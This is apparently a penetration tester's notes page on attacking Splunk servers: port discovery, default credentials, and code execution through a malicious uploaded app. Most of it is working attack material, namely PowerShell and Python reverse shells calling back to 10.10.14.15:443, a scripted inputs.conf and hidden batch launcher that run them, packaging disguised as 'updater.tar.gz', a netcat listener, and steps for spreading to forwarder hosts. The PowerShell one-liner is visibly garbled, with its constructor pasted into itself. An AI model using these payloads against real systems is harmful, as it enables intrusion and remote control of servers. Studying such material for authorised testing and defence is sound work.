# Splunk

Typically used as a SIEM tool for security monitoring and sometimes business analytics. This is typically encounter on the internal portion of a pentest. The biggest focus of Splunk during an assessment would be weak or null authentication because admin access to Splunk gives us the ability to deploy custom applications that can be used to quickly compromise a Splunk server and possibly other hosts in the network depending on the way Splunk is set up.

> Splunk is typically running as ROOT or NT AUTHORITY/SYSTEM on the servers it is installed on, so RCE can be powerful.&#x20;

### Discovery/Footprinting&#x20;

Splunk runs by default on port 8000.

```shell-session
sudo nmap -sV 10.129.201.50

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 08:43 EDT
Nmap scan report for 10.129.201.50
Host is up (0.11s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  ssl/http      Splunkd httpd
8080/tcp open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp open  ssl/http      Splunkd httpd
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

> when accessing the instance, splunk typically uses https.\
>

On older versions of Splunk, the default credentials are `admin:changeme`

### Splunk Enterprise Trial

The Splunk Enterprise trial becomes a free version after 60 days without requiring authentication. Its not uncommon to be installed as part of a POC or trial and forgotten about. fs

Once logged in to Splunk (or having accessed an instance of Splunk Free), we can browse data, run reports, create dashboards, install applications from the Splunkbase library, and install custom applications.

### Code Execution via built in functionality&#x20;

We can use the following package to install a malicious application on splunk to achieve code execution:&#x20;

[https://github.com/0xjpuff/reverse\_shell\_splunk](https://github.com/0xjpuff/reverse_shell_splunk)\
\
1\. Create a directory with following structure:&#x20;

```shell-session
splunk_shell/
├── bin
└── default

# Bin will contain our payload scripts, default will contain inputs.conf file
```

2. Create our Payloads&#x20;
   1.  PowerShell (Windows) run.ps1

       ```powershell-session
       #A simple and small reverse shell. Options and help removed to save space. 
       #Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
       $client = New-Object System.Net.Sockets.TCPClient$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
       ```
   2.  Python (Linux) rev.py&#x20;

       ```python
       import sys,socket,os,pty

       ip="10.10.14.15"
       port="443"
       s=socket.socket()
       s.connect((ip,int(port)))
       [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
       pty.spawn('/bin/bash')
       ```
3.  Create inputs.conf, which defines which scripts are ran and the interval&#x20;

    ```shell-session
    [script://./bin/rev.py]
    disabled = 0  
    interval = 10  
    sourcetype = shell 

    [script://.\bin\run.bat]
    disabled = 0
    sourcetype = shell
    interval = 10
    ```
4.  Create run.bat&#x20;

    ```shell-session
    @ECHO OFF
    PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
    Exit
    ```
5.  Tar the package&#x20;

    ```shell-session
    tar -cvzf updater.tar.gz splunk_shell/
    ```
6.  start listener&#x20;

    ```shell-session
    sudo nc -lnvp 443
    ```
7. Upload App
   1.

       <figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

       <figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### Lateral Movement&#x20;

If the splunk host is a deployment server, we can possibly achieve RCE on any other hosts with universal splunk forwarders installed on them. our package must  be placed in `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.



